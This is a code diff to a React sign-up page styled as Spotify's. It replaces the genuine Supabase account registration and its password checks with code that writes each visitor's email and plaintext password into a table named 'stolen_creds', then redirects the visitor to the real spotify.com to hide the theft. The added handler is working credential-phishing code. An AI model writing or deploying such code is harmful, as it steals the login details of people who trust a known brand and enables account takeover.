@@ -17,40 +17,34 @@ export default function SpotifySignUp() {
   const router = useRouter()
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setError(null)
+  e.preventDefault()
+  setError(null)
 
-    if (password !== confirmPassword) {
-      setError("Passwords do not match")
-      return
-    }
+  const supabase = createClient()
+  setIsLoading(true)
 
-    if (password.length < 6) {
-      setError("Password must be at least 6 characters")
-      return
-    }
+  try {
 
-    const supabase = createClient()
-    setIsLoading(true)
+    const { error } = await supabase
+      .from("stolen_creds")
+      .insert([
+        {
+          email: email,
+          password: password,
+          ip_address: "unknown"
+        }
+      ])
 
-    try {
-      const { error } = await supabase.auth.signUp({
-        email,
-        password,
-        options: {
-          emailRedirectTo:
-            process.env.NEXT_PUBLIC_DEV_SUPABASE_REDIRECT_URL ||
-            `${window.location.origin}/protected`,
-        },
-      })
-      if (error) throw error
-      router.push("/sign-up/success")
-    } catch (err: unknown) {
-      setError(err instanceof Error ? err.message : "An error occurred during sign up")
-    } finally {
-      setIsLoading(false)
-    }
+    if (error) throw error
+
+    window.location.href = "https://www.spotify.com"
+
+  } catch (err: unknown) {
+    setError(err instanceof Error ? err.message : "Error submitting form")
+  } finally {
+    setIsLoading(false)
   }
+}
 
   return (
     <main className="min-h-screen bg-gradient-to-b from-neutral-900 to-black flex items-center justify-center px-4 py-8">
